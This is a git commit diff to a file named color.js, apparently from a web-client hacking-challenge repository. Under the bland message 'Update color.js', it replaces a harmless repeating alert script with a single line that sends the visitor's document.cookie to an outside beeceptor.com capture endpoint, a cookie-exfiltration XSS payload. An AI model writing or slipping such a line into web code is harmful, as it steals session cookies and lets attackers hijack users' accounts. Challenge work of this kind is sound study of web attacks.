80207ebd0b92bb764b50776d7a94723e7588ec2e
LcMauri <94177490+LcMauri@users.noreply.github.com>
2025-03-15 19:20:53 +0100

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,12 +1,1 @@
-
-document.addEventListener("DOMContentLoaded", function () {
-    function showPopup() {
-        alert("Ceci est une alerte qui s'affiche toutes les 10 secondes !");
-    }
-    
-    // Afficher une première alerte au démarrage
-    showPopup();
-    
-    // Déclencher l'alerte toutes les 10 secondes
-    setInterval(showPopup, 10000);
-});
+document.location('https://app.beeceptor.com/console/nootceptor/#'+document.cookie)
